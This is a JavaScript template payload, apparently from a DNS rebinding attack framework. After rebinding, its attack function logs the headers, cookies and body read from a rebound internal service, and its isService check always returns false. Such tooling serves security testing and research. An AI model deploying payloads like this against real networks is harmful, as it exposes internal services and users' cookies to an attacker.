/**
This is a sample payload to make a simple GET request and display the response.
Copy the content of this file to a new .js file and add its name to the
`attackPayloads` list in the manager-config.json file.
**/

const SimpleFetchGet = () => {

    // Invoked after DNS rebinding has been performed
    function attack(headers, cookie, body) {
        if (headers !== null) {
            console.log(`Origin: ${window.location} headers: ${httpHeaderstoText(headers)}`);
        };
        if (cookie !== null) {
            console.log(`Origin: ${window.location} headers: ${cookie}`);
        };
        if (body !== null) {
            console.log(`Origin: ${window.location} body:\n${body}`);
        };
    }

    // Invoked to determine to detect whether the rebinded service
    // is the one targetted by this payload. Must return true or false.
    function isService(headers, cookie, body) {
        return false;
    }

    return {
        attack,
        isService
    }
}

// Registry value and manager-config.json value must match
Registry["Simple Fetch Get"] = SimpleFetchGet();



